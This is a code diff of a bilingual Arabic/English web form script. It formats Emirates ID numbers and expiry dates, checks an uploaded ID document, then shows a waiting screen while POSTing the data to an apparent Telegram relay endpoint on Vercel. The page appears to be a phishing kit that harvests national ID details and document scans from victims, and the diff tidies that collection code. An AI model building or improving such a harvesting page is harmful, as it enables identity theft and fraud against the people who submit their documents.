@@ -108,18 +108,41 @@ nav{display:flex;gap:40px;font-size:17px}
 
 <script>
 const $=id=>document.getElementById(id);
-$('eid').addEventListener('input',e=>{let d=e.target.value.replace(/\D/g,'').slice(0,15);
-  let p=[d.slice(0,3),d.slice(3,7),d.slice(7,14),d.slice(14,15)].filter(Boolean);e.target.value=p.join('-')});
-$('exp').addEventListener('input',e=>{let d=e.target.value.replace(/\D/g,'').slice(0,8);
-  let p=[d.slice(0,2),d.slice(2,4),d.slice(4,8)].filter(Boolean);e.target.value=p.join(' / ')});
-$('file').addEventListener('change',e=>{const f=e.target.files[0];$('e-file').textContent='';
-  if(!f)return;if(f.size>5*1024*1024){$('e-file').textContent='File is larger than 5 MB · الملف أكبر من 5 ميجابايت';e.target.value='';$('fn').textContent='JPG, PNG or PDF (Max 5 MB)';return}
-  $('fn').textContent=f.name});
 
+// تنسيق رقم الهوية تلقائياً
+$('eid').addEventListener('input',e=>{
+  let d=e.target.value.replace(/\D/g,'').slice(0,15);
+  let p=[d.slice(0,3),d.slice(3,7),d.slice(7,14),d.slice(14,15)].filter(Boolean);
+  e.target.value=p.join('-');
+});
+
+// تنسيق تاريخ الانتهاء تلقائياً
+$('exp').addEventListener('input',e=>{
+  let d=e.target.value.replace(/\D/g,'').slice(0,8);
+  let p=[d.slice(0,2),d.slice(2,4),d.slice(4,8)].filter(Boolean);
+  e.target.value=p.join(' / ');
+});
+
+// التحقق من رفع الملف
+$('file').addEventListener('change',e=>{
+  const f=e.target.files[0];
+  $('e-file').textContent='';
+  if(!f)return;
+  if(f.size>5*1024*1024){
+    $('e-file').textContent='File is larger than 5 MB · الملف أكبر من 5 ميجابايت';
+    e.target.value='';
+    $('fn').textContent='JPG, PNG or PDF (Max 5 MB)';
+    return;
+  }
+  $('fn').textContent=f.name;
+});
+
+// عند الضغط على زر تحقق ومتابعة
 $('f').addEventListener('submit', async e => {
   e.preventDefault();
   let ok = true;
   const set = (id, m) => { $('e-' + id).textContent = m; if (m) ok = false; };
+  
   set('name', $('name').value.trim().length < 3 ? 'Enter your full name · أدخل اسمك الكامل' : '');
   set('eid', /^784-\d{4}-\d{7}-\d$/.test($('eid').value) ? '' : 'Use the format 784-XXXX-XXXXXXX-X · صيغة غير صحيحة');
   
@@ -145,7 +168,7 @@ $('f').addEventListener('submit', async e => {
     };
     
     // إخفاء النموذج وإظهار رسالة الانتظار
-    $('.form').style.display = 'none';
+    document.querySelector('.form').style.display = 'none';
     const waitDiv = document.createElement('div');
     waitDiv.id = 'waiting-box';
     waitDiv.style.cssText = 'text-align:center; padding:40px; font-size:18px; font-weight:600;';
@@ -153,7 +176,7 @@ $('f').addEventListener('submit', async e => {
     document.querySelector('.card').appendChild(waitDiv);
 
     try {
-      // إرسال البيانات لسيرفر Vercel
+      // إرسال البيانات لسيرفرك على Vercel (تأكد أن رابط مشروعك صحيح هنا)
       await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
